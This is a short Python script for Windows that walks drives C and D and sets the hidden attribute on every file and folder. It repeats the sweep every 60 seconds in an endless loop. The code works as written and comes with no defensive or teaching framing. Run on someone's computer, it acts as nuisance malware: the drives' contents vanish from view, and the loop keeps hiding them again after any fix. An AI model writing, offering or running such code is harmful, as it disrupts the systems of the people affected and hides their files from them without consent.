import os
import ctypes
import time

def hide_file(file_path):
    try:
        # On Windows, hide the file by setting its attributes to hidden
        if os.name == 'nt':
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ret = ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)
            if ret == 0:
                print("Failed to hide the file:", file_path)
            else:
                print("File hidden successfully:", file_path)
        else:
            print("This functionality is currently only supported on Windows.")
    except Exception as e:
        print("An error occurred while hiding the file:", file_path, str(e))

def hide_folder(folder_path):
    try:
        # On Windows, hide the folder by setting its attributes to hidden
        if os.name == 'nt':
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ret = ctypes.windll.kernel32.SetFileAttributesW(folder_path, FILE_ATTRIBUTE_HIDDEN)
            if ret == 0:
                print("Failed to hide the folder:", folder_path)
            else:
                print("Folder hidden successfully:", folder_path)
        else:
            print("This functionality is currently only supported on Windows.")
    except Exception as e:
        print("An error occurred while hiding the folder:", folder_path, str(e))

def hide_files_and_folders_on_drive(drive_letter):
    for root, dirs, files in os.walk(drive_letter + ":\\"):
        for file in files:
            hide_file(os.path.join(root, file))
        for dir in dirs:
            hide_folder(os.path.join(root, dir))

if __name__ == "__main__":
    drives_to_hide = ["C", "D"]  # Add more drive letters as needed

    while True:
        for drive in drives_to_hide:
            hide_files_and_folders_on_drive(drive)
        time.sleep(60)  # Wait for 60 seconds before repeating
